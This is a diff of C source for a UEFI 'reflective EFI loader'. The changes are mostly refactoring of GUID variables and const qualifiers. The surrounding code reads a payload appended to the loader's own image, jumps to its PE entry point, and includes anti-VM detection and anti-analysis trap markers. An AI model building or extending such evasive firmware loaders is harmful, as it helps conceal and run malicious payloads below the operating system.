@@ -5,7 +5,7 @@
 //     LOCATION : Ukraine
 //
 // [ PINFO ]
-//     DATE     : 05.08.2026
+//     DATE     : 17.11.2026
 //     PROJECT  : REFLECTIVE-EFI-LOADER
 //     PLATFORM : UEFI
 /*=====================================*/
@@ -28,8 +28,8 @@ INTERNAL LOADER DECLARATIONS */
 #include "loader.h"
 
 
-#if !defined(_GNU_EFI)
-    #error "efildr: GNU-EFI headers are required."
+#if !defined(EFILDR_UEFIDEF_H)
+    #error "loader.c: uefidef.h are required."
 #endif
 
 
@@ -282,16 +282,19 @@ DEC_FUNC(VOID) UnPackData(
 
 /* Extracts the appended payload overlay
    from the current process image file */
-DEC_FUNC(const UINT8*) ReadOverLay(
+DEC_FUNC(UINT8*) ReadOverLay(
     CONST_PTR(EFI_LOADED_IMAGE_PROTOCOL) LoadedImage
 ) {
     /* Initialize with size marker length
        for the initial read */
     UINT32 tlLn = DAT_LEN_SZ;
 
-    UINT8            *dtBuf    = NULL;
-    CONST_PTR(CHAR16) PathName = EFI_IMAGE_PATH(LoadedImage);
+    UINT8        *dtBuf    = NULL;
+    CHAR16 *const PathName = EFI_IMAGE_PATH(LoadedImage);
 
+
+    EFI_GUID FileSystemGuid = EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID;
+    EFI_GUID FileInfoGuid   = EFI_FILE_INFO_ID;
 
     EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FsProt   = NULL;
     EFI_FILE_PROTOCOL               *Volume   = NULL;
@@ -306,7 +309,7 @@ DEC_FUNC(const UINT8*) ReadOverLay(
     /* Get and Open the EFI Simple File System protocol */
     IF_EFIFAIL_CHAINCALL (
         IN(BS->HandleProtocol, LoadedImage->DeviceHandle,
-           &FileSystemProtocol, (VOID**)&FsProt),
+           &FileSystemGuid, (VOID**)&FsProt),
 
         IN(FsProt->OpenVolume, FsProt, &Volume)
     ) goto _ret;
@@ -323,7 +326,7 @@ DEC_FUNC(const UINT8*) ReadOverLay(
 
         /* 3. Read the EFI_FILE_INFO structure */
         IN(File->GetInfo, File,
-           &GenericFileInfo, &InfoSize, FileInfo)
+           &FileInfoGuid, &InfoSize, FileInfo)
     ) goto _ret;
 
 
@@ -371,7 +374,7 @@ _ret:
     IF_LIKE (File)     EFI_CALL(File->Close,   File  );
     IF_LIKE (Volume)   EFI_CALL(Volume->Close, Volume);
 
-    return (const UINT8*)dtBuf;
+    return (UINT8*)dtBuf;
 }
 
 
@@ -380,7 +383,7 @@ _ret:
 /* Anti-VM Engine:
    Returns TRUE if virtual machine is DETECTED */
 #if (USING_ANTI_VM)
-DEC_FUNC(BOOLEAN) AntiVM(CONST_PTR(VOID) ImageHandle) {
+DEC_FUNC(BOOLEAN) AntiVM(EFI_HANDLE ImageHandle) {
     BOOLEAN is_VM = TRUE;
     EFI_HANDLE *hBuffer = NULL;
 
@@ -536,11 +539,13 @@ _ANTITRAP();
 
 
 {//* MAIN
+    EFI_GUID LoadedImageGuid = EFI_LOADED_IMAGE_PROTOCOL_GUID;
+
     VOID                      *img         = NULL;
     EFI_LOADED_IMAGE_PROTOCOL *LoadedImage = NULL;
 
     IF_EFIFAIL_CALL (BS->HandleProtocol,
-        ImageHandle, &gEfiLoadedImageProtocolGuid,
+        ImageHandle, &LoadedImageGuid,
         (VOID**)&LoadedImage
     ) LDR_EXIT(LDR_ERR_LOADED_IMAGE);
 _ANTITRAP();
@@ -553,7 +558,7 @@ _ANTITRAP();
         4: raw_len   : DAT_LEN_SZ
         5: payload   : PE_EXE
     */
-    const UINT8 *PE_DAT = ReadOverLay(LoadedImage);
+    UINT8 *PE_DAT = ReadOverLay(LoadedImage);
 _ANTITRAP();
     IF_UNLIKE (!PE_DAT) LDR_EXIT(LDR_ERR_OVERLAY);
 
@@ -666,7 +671,7 @@ _ANTITRAP(); DEC_ASM (
 
         : : "r"(AddrOfEntryPoint), "r"(ImageHandle), "r"(SystemTable)
         : "memory", "cc", "rax", "rcx", "rdx"
-    );
+    ); __builtin_unreachable();
 
 
 
